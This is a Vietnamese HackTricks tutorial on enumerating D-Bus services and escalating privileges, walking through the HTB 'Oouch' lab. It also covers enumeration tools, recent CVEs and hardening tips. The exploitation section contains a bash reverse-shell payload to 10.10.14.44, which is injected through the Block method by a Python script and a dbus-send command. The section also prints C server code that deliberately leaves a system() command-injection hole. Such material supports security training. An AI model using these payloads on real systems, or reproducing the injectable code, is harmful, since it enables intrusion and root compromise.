# D-Bus Enumeration & Command Injection leo thang đặc quyền

{{#include ../../banners/hacktricks-training.md}}

## **Liệt kê GUI**

D-Bus được sử dụng làm trung gian giao tiếp liên tiến trình (IPC) trong các môi trường desktop Ubuntu. Trên Ubuntu, có thể thấy nhiều message bus hoạt động đồng thời: system bus, chủ yếu được **các dịch vụ có đặc quyền sử dụng để cung cấp các dịch vụ liên quan đến toàn hệ thống**, và session bus cho mỗi người dùng đã đăng nhập, cung cấp các dịch vụ chỉ liên quan đến người dùng cụ thể đó. Ở đây, trọng tâm chủ yếu là system bus do nó liên quan đến các dịch vụ chạy với đặc quyền cao hơn (ví dụ: root), vì mục tiêu của chúng ta là leo thang đặc quyền. Kiến trúc của D-Bus sử dụng một “router” cho mỗi session bus, chịu trách nhiệm chuyển hướng thông điệp của client đến các dịch vụ phù hợp, dựa trên địa chỉ mà client chỉ định cho dịch vụ họ muốn giao tiếp.<sup>[[1]](#references)</sup>

Các dịch vụ trên D-Bus được định nghĩa bởi các **object** và **interface** mà chúng cung cấp. Có thể xem object như các thể hiện lớp trong các ngôn ngữ OOP thông thường; mỗi thể hiện được xác định duy nhất bằng một **object path**. Path này, tương tự như path của filesystem, xác định duy nhất từng object do dịch vụ cung cấp. Một interface quan trọng phục vụ mục đích nghiên cứu là **org.freedesktop.DBus.Introspectable**, có một phương thức duy nhất là Introspect. Phương thức này trả về biểu diễn XML các phương thức, tín hiệu và thuộc tính mà object hỗ trợ; ở đây tập trung vào các phương thức, đồng thời bỏ qua thuộc tính và tín hiệu.

Để giao tiếp với interface D-Bus, có hai công cụ được sử dụng: công cụ CLI có tên **gdbus**, giúp dễ dàng gọi các phương thức do D-Bus cung cấp trong các script, và [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), công cụ GUI dựa trên Python được thiết kế để liệt kê các dịch vụ có trên mỗi bus và hiển thị các object thuộc từng dịch vụ.

```bash
sudo apt-get install d-feet
```

Nếu bạn đang kiểm tra **session bus**, hãy xác nhận địa chỉ hiện tại trước:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Trong hình đầu tiên, các service được đăng ký với D-Bus system bus được hiển thị, trong đó **org.debin.apt** được tô sáng sau khi chọn nút System Bus. D-Feet truy vấn service này để lấy các object, rồi hiển thị interface, method, property và signal của những object được chọn, như trong hình thứ hai. Signature của từng method cũng được mô tả chi tiết.

Một tính năng đáng chú ý là hiển thị **process ID (pid)** và **command line** của service, hữu ích để xác nhận service có chạy với đặc quyền nâng cao hay không — điều quan trọng đối với mức độ liên quan của nghiên cứu.

**D-Feet cũng cho phép gọi method**: người dùng có thể nhập biểu thức Python làm tham số; D-Feet sẽ chuyển đổi chúng thành kiểu D-Bus trước khi gửi đến service.

Tuy nhiên, lưu ý rằng **một số method yêu cầu xác thực** trước khi cho phép chúng ta gọi. Chúng ta sẽ bỏ qua các method này, vì ngay từ đầu mục tiêu của chúng ta là nâng cao đặc quyền mà không cần thông tin xác thực.

Cũng lưu ý rằng một số service truy vấn một D-Bus service khác có tên org.freedeskto.PolicyKit1 để xác định người dùng có được phép thực hiện một số hành động nhất định hay không.

## **Liệt kê qua dòng lệnh**

### Liệt kê các Object của Service

Có thể liệt kê các interface D-Bus đang được mở bằng:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

Các service được đánh dấu **`(activatable)`** đặc biệt đáng chú ý vì chúng **chưa chạy**, nhưng một yêu cầu trên bus có thể khởi động chúng theo yêu cầu. Đừng chỉ dừng ở `busctl list`; hãy xác định các tên đó tương ứng với những binary thực tế nào sẽ được thực thi.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

Điều đó nhanh chóng cho bạn biết đường dẫn `Exec=` nào sẽ được chạy cho một tên có thể kích hoạt và dưới danh tính nào. Nếu binary hoặc chuỗi thực thi của nó được bảo vệ yếu, một service không hoạt động vẫn có thể trở thành con đường privilege-escalation.

Đối với một service ghi ảnh USB có đặc quyền, hãy đối chiếu tên system-bus của nó với chính sách **effective** cho hành động ghi ảnh. Một quy tắc vendor cũ có thể cấp `ResultActive=yes` cho một nhóm Unix quản trị mà không yêu cầu nhập mật khẩu; hãy xác nhận tài khoản hiện tại thuộc nhóm đó, phiên đang active, quy tắc thực sự được tải và không bị ghi đè, đồng thời helper đã cài đặt vẫn chấp nhận đường dẫn nguồn và đích do caller chọn. Chỉ riêng service descriptor hoặc phiên bản package cũ không chứng minh được khả năng truy cập tùy ý các file. Thiếu activation descriptor cũng không loại trừ khả năng service đang chạy. Kiểm tra các file chính sách và service cố định mà không gọi phương thức ghi ảnh; xem [phân tích service gốc](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).

#### Các kết nối

[Theo Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Khi một process thiết lập kết nối với một bus, bus cấp cho kết nối một tên bus đặc biệt gọi là _tên kết nối duy nhất_. Tên bus thuộc loại này là bất biến—đảm bảo chúng không thay đổi chừng nào kết nối còn tồn tại—và quan trọng hơn, không thể được sử dụng lại trong suốt vòng đời của bus. Điều này có nghĩa là không kết nối nào khác với bus đó có thể được gán tên kết nối duy nhất như vậy, ngay cả khi cùng một process đóng kết nối với bus rồi tạo một kết nối mới. Tên kết nối duy nhất rất dễ nhận biết vì chúng bắt đầu bằng ký tự hai chấm—vốn bị cấm trong các trường hợp khác.<sup>[[4]](#references)</sup>

### Thông tin đối tượng service

Sau đó, bạn có thể lấy một số thông tin về interface bằng lệnh:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

Ngoài ra, hãy đối chiếu tên bus với unit `systemd` và đường dẫn của tệp thực thi:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

Điều này trả lời câu hỏi thực tế quan trọng trong quá trình privesc: **nếu một method call thành công, binary và unit thực tế nào sẽ thực hiện hành động đó?**

### Liệt kê các Interface của một Service Object

Bạn cần có đủ quyền.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Khảo sát Interface của một Service Object

Lưu ý rằng trong ví dụ này, interface mới nhất được phát hiện đã được chọn bằng tham số `tree` (_xem phần trước_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Lưu ý method `.Block` của interface `htb.oouch.Block` (method mà chúng ta quan tâm). Chữ "s" ở các cột khác có thể cho biết nó đang chờ một chuỗi.

Trước khi thử bất kỳ thứ gì nguy hiểm, hãy xác thực một method **chỉ đọc** hoặc có rủi ro thấp trước. Việc này giúp phân biệt rõ ba trường hợp: sai cú pháp, có thể truy cập nhưng bị từ chối, hoặc có thể truy cập và được phép.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### Đối chiếu các phương thức D-Bus với policy và action

Introspection cho bạn biết **có thể** gọi những gì, nhưng không cho biết **vì sao** một lệnh gọi được phép hoặc bị từ chối. Để triage privesc thực tế, bạn thường cần kiểm tra đồng thời **ba lớp**:

1. **Metadata kích hoạt** (`.service` files hoặc `SystemdService=`) để biết binary và unit nào sẽ thực sự chạy.
2. **Policy XML của D-Bus** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) để biết ai có thể `own`, `send_destination` hoặc `receive_sender`.
3. **Các file action của Polkit** (`/usr/share/polkit-1/actions/*.policy`) để biết mô hình ủy quyền mặc định (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Các lệnh hữu ích:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Do **not** giả định có ánh xạ 1:1 giữa một method D-Bus và một action Polkit. Cùng một method có thể chọn action khác nhau tùy thuộc vào object đang được chỉnh sửa hoặc ngữ cảnh runtime. Vì vậy, quy trình thực tế là:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` và grep các file `.policy` liên quan
3. Thăm dò trực tiếp với rủi ro thấp bằng `busctl call`, `gdbus call` hoặc `dbusmap --enable-probes --null-agent`

Các dịch vụ proxy hoặc tương thích cần được chú ý thêm. Một **proxy chạy dưới quyền root** chuyển tiếp các request đến một dịch vụ D-Bus khác qua kết nối đã được thiết lập sẵn của chính nó có thể vô tình khiến backend xem mọi request như đến từ UID 0, trừ khi danh tính của caller ban đầu được xác thực lại.<sup>[[3]](#references)</sup>

### Giao diện Monitor/Capture

Với đủ quyền (chỉ có quyền `send_destination` và `receive_sender` là chưa đủ), bạn có thể **monitor giao tiếp D-Bus**.

Để **monitor** một **giao tiếp**, bạn cần là **root**. Nếu vẫn gặp vấn đề khi chạy dưới quyền root, hãy xem [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) và [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Nếu bạn biết cách cấu hình file D-Bus để **cho phép người dùng không phải root sniff** giao tiếp này, vui lòng **liên hệ với tôi**!

Các cách monitor khác nhau:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

Trong ví dụ sau, interface `htb.oouch.Block` được giám sát và **thông điệp "**_**lalalalal**_**" được gửi do nhầm lẫn trong giao tiếp**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Bạn có thể dùng `capture` thay cho `monitor` để lưu kết quả vào tệp **pcapng** mà Wireshark có thể mở:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### Lọc bỏ toàn bộ thông tin nhiễu <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Nếu có quá nhiều thông tin trên bus, hãy truyền một quy tắc khớp như sau:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Có thể chỉ định nhiều quy tắc. Nếu một thông điệp khớp với _bất kỳ_ quy tắc nào, thông điệp đó sẽ được in ra. Ví dụ:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

Xem [tài liệu D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) để biết thêm thông tin về cú pháp quy tắc khớp.<sup>[[7]](#references)</sup>

### Thêm

`busctl` còn có nhiều tùy chọn khác, [**xem tất cả tại đây**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Kịch bản dễ bị tấn công**

Với tư cách người dùng **qtc trên host "oouch" thuộc HTB**, bạn có thể tìm thấy một **file cấu hình D-Bus bất thường** tại _/etc/dbus-1/system.d/htb.oouch.Block.conf_:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Lưu ý từ cấu hình trước đó rằng **bạn cần là người dùng `root` hoặc `www-data` để gửi và nhận thông tin** qua giao tiếp D-BUS này.

Với tư cách người dùng **qtc** bên trong container docker **aeb4525789d8**, bạn có thể tìm thấy một số đoạn mã liên quan đến dbus trong tệp _/code/oouch/routes.py._ Đây là đoạn mã đáng chú ý:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

Như bạn có thể thấy, nó **đang kết nối đến một D-Bus interface** và gửi "client_ip" đến **hàm "Block"**.

Ở đầu bên kia của kết nối D-Bus có một binary C đã biên dịch đang chạy. Đoạn code này **đang lắng nghe** kết nối D-Bus **để nhận địa chỉ IP và gọi iptables thông qua hàm `system`** nhằm chặn địa chỉ IP được gửi đến.\
**Lệnh gọi `system` cố ý có lỗ hổng command injection**, vì vậy payload như sau sẽ tạo reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Ở cuối trang này, bạn có thể tìm thấy **toàn bộ mã C của ứng dụng D-Bus**. Trong đó, bạn có thể xem ở các dòng 91-97 **cách `D-Bus object path`** **và `interface name`** được **đăng ký**. Thông tin này sẽ cần thiết để gửi dữ liệu đến kết nối D-Bus:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Ngoài ra, ở dòng 57, bạn có thể thấy rằng **phương thức duy nhất được đăng ký** cho giao tiếp D-Bus này có tên là `Block`(_**Đó là lý do payload trong phần tiếp theo sẽ được gửi đến service object `htb.oouch.Block`, interface `/htb/oouch/Block` và tên phương thức `Block`**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

Đoạn mã Python sau sẽ gửi payload đến kết nối D-Bus để gọi phương thức `Block` thông qua `block_iface.Block(runme)` (_lưu ý rằng đoạn mã này được trích từ phần mã trước đó_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl and dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` là công cụ dùng để gửi thông điệp đến “Message Bus”
- Message Bus – Phần mềm được hệ thống sử dụng để giúp các ứng dụng giao tiếp với nhau dễ dàng. Nó liên quan đến Message Queue (các thông điệp được sắp xếp theo thứ tự), nhưng trong Message Bus, các thông điệp được gửi theo mô hình đăng ký nhận và cũng rất nhanh.
- Thẻ “-system” được dùng để chỉ định đây là thông điệp hệ thống, không phải thông điệp phiên (mặc định).
- Thẻ “–print-reply” được dùng để in thông điệp của chúng ta đúng định dạng và nhận mọi phản hồi ở định dạng mà con người có thể đọc được.
- “–dest=Dbus-Interface-Block” là địa chỉ của giao diện Dbus.
- “–string:” – Loại thông điệp chúng ta muốn gửi đến giao diện. Có một số định dạng để gửi thông điệp như double, bytes, booleans, int, objpath. Trong số đó, “object path” hữu ích khi chúng ta muốn gửi đường dẫn tệp đến giao diện Dbus. Trong trường hợp này, chúng ta có thể dùng một tệp đặc biệt (FIFO) để truyền lệnh đến giao diện dưới dạng tên tệp. “string:;” – Dùng để gọi lại object path, nơi chúng ta đặt tệp/lệnh reverse shell FIFO.

_Lưu ý rằng trong `htb.oouch.Block.Block`, phần đầu (`htb.oouch.Block`) tham chiếu đến đối tượng dịch vụ, còn phần cuối (`.Block`) tham chiếu đến tên phương thức._

### C code

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Công cụ hỗ trợ Enumeration tự động (2023-2025)

Enumeration thủ công một attack surface D-Bus lớn bằng `busctl`/`gdbus` nhanh chóng trở nên khó khăn. Hai tiện ích FOSS nhỏ được phát hành trong vài năm gần đây có thể giúp tăng tốc trong các đợt red-team hoặc CTF:

### dbusmap ("Nmap for D-Bus")
* Tác giả: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Được viết bằng C; một binary tĩnh duy nhất (<50 kB) duyệt qua mọi object path, lấy XML `Introspect` và ánh xạ nó tới PID/UID sở hữu.<sup>[[5]](#references)</sup>
* Các flag hữu ích:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* Công cụ đánh dấu các well-known name không được bảo vệ bằng `!`, giúp nhanh chóng phát hiện các service bạn có thể *own* (chiếm quyền) hoặc các method call có thể truy cập từ shell không có đặc quyền.

### uptux.py
* Tác giả: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Script chỉ dùng Python, tìm các đường dẫn *writable* trong systemd unit **và** các tệp policy D-Bus có quyền quá rộng (ví dụ: `send_destination="*"`).<sup>[[6]](#references)</sup>
* Cách dùng nhanh:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* Module D-Bus tìm kiếm các thư mục bên dưới và làm nổi bật mọi service có thể bị giả mạo hoặc chiếm quyền bởi người dùng thông thường:
  * `/etc/dbus-1/system.d/` và `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (ghi đè từ nhà cung cấp)

---

## Các lỗi leo thang đặc quyền D-Bus đáng chú ý (2024-2025)

Theo dõi các CVE mới được công bố giúp phát hiện những mẫu không an toàn tương tự trong mã tùy chỉnh. Hai ví dụ gần đây tiêu biểu là:<sup>[[2]](#references)[[3]](#references)</sup>

| Năm | CVE | Thành phần | Nguyên nhân gốc rễ | Bài học tấn công |
|------|-----|-----------|------------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Service chạy với quyền root để lộ một giao diện D-Bus mà người dùng không có đặc quyền có thể cấu hình lại, bao gồm cả việc tải hành vi macro do kẻ tấn công kiểm soát. | Nếu một daemon cung cấp **quản lý thiết bị/profile/cấu hình** trên system bus, hãy xem cấu hình có thể ghi và các tính năng macro là nguyên thủy thực thi mã, không chỉ là "cài đặt". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Một proxy tương thích chạy với quyền root chuyển tiếp yêu cầu đến các service backend mà không giữ nguyên ngữ cảnh bảo mật của caller ban đầu, khiến backend tin proxy là UID 0. | Xem các service D-Bus dạng **proxy / bridge / tương thích** là một nhóm lỗi riêng: nếu chúng chuyển tiếp các lệnh gọi có đặc quyền, hãy xác minh UID/Polkit context của caller được chuyển đến backend như thế nào. |

Các mẫu cần lưu ý:
1. Service chạy **với quyền root trên system bus**.
2. Hoặc **không có bước kiểm tra ủy quyền**, hoặc bước kiểm tra được thực hiện với **đối tượng không đúng**.
3. Phương thức có thể truy cập cuối cùng làm thay đổi trạng thái hệ thống: cài đặt package, thay đổi người dùng/nhóm, cấu hình bootloader, cập nhật profile thiết bị, ghi tệp hoặc thực thi lệnh trực tiếp.

Dùng `dbusmap --enable-probes` hoặc `busctl call` thủ công để xác nhận một phương thức có thể được truy cập hay không, sau đó kiểm tra policy XML của service và các Polkit action để hiểu **đối tượng nào** thực sự được cấp quyền.

---

## Các biện pháp nhanh để tăng cường bảo mật và phát hiện

* Tìm các policy cho phép mọi người ghi hoặc mở *send/receive*:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* Yêu cầu Polkit cho các method nguy hiểm – ngay cả các proxy chạy với quyền *root* cũng nên truyền PID của *caller* vào `polkit_authority_check_authorization_sync()` thay vì PID của chính chúng.
* Hạ quyền trong các helper chạy lâu dài (dùng `sd_pid_get_owner_uid()` để chuyển namespace sau khi kết nối với bus).
* Nếu không thể gỡ bỏ một service, ít nhất hãy giới hạn service đó trong một Unix group riêng và hạn chế quyền truy cập trong policy XML.
* Blue-team: ghi lại system bus bằng `busctl capture > /var/log/dbus_$(date +%F).pcapng` rồi nhập dữ liệu vào Wireshark để phát hiện bất thường.

---

## References

- [1] [USBCreator: leo thang đặc quyền qua D-Bus trong Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service cho phép mọi người dùng không có đặc quyền cấu hình](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: bỏ qua xác thực trong dịch vụ D-Bus proxy Deepin (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
